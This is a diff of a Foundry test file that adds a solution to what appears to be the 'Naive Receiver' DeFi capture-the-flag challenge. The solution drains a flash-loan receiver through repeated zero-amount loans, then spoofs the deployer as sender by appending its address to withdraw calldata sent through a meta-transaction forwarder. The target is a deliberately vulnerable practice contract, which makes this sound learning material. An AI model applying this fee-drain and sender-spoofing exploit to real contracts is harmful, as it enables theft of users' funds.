@@ -33,6 +33,7 @@ contract NaiveReceiverChallenge is Test {
      */
     function setUp() public {
         (player, playerPk) = makeAddrAndKey("player");
+        // Simulates actions from the deployer account by manipulating the blockchain state to set initial conditions without actual transactions.
         startHoax(deployer);
 
         // Deploy WETH
@@ -74,15 +75,60 @@ contract NaiveReceiverChallenge is Test {
     }
 
     /**
-     * CODE YOUR SOLUTION HERE
+     * The goal is to exploit vulnerabilities in the NaiveReceiverPool and FlashLoanReceiver to drain all WETH from the receiver and the pool, and then transfer it to a recovery account.
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
-    }
+        bytes[] memory callDatas = new bytes[](11);
+        /**
+         * The function constructs an array of call data callDatas for 11 calls. 
+         * The first 10 iterations of the loop encode calls to the flashLoan function of the NaiveReceiverPool, 
+         * each attempting to trigger the flash loan mechanism on the FlashLoanReceiver with a loan amount of 0 and empty data. 
+         * These calls exploit the receiver’s failure to properly handle flash loan fees, draining its WETH by repeatedly incurring fees.
+         */
+        for (uint256 i = 0; i < 10; i++) {
+            callDatas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, "0x"));
+        }
+        /**
+         * The 11th call encodes a call to withdraw from NaiveReceiverPool to transfer all remaining WETH (from both the pool and the receiver) to the recovery account. 
+         * This step assumes the previous calls successfully depleted the receiver's WETH balance.
+         */
+        callDatas[10] = abi.encodePacked(
+            abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
+            bytes32(uint256(uint160(deployer)))
+        );
 
+        bytes memory callData;
+        /**
+         * All individual call data entries are combined into a single call to pool.multicall, 
+         * which allows executing all 11 operations in one transaction, utilizing the Multicall functionality embedded in the pool.
+         */
+        callData = abi.encodeCall(pool.multicall, callDatas);
+
+        // A BasicForwarder.Request is then created, packaging the multicall as a meta-transaction.
+        BasicForwarder.Request memory request =
+            BasicForwarder.Request(player, address(pool), 0, gasleft(), forwarder.nonces(player), callData, 1 days);
+        
+        // The request is hashed using the EIP-712 standard, which involves the domain separator from the forwarder and the data-specific hash.
+        bytes32 requestHash =
+            keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));
+        
+        /**
+         * Using the player's private key (playerPk), the request hash is signed. 
+         * This step is simulated using Foundry's vm.sign, which mimics the cryptographic signing process.
+         */
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+        /**
+         * The signed request is sent to the forwarder.execute, which processes the meta-transaction. 
+         * If the validation and execution are successful, this transaction will execute the multicall, 
+         * which in turn processes all the flash loans and the withdrawal, thereby solving the challenge.
+         */
+        forwarder.execute(request, signature);
+    }
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
      */
+
     function _isSolved() private view {
         // Player must have executed two or less transactions
         assertLe(vm.getNonce(player), 2);
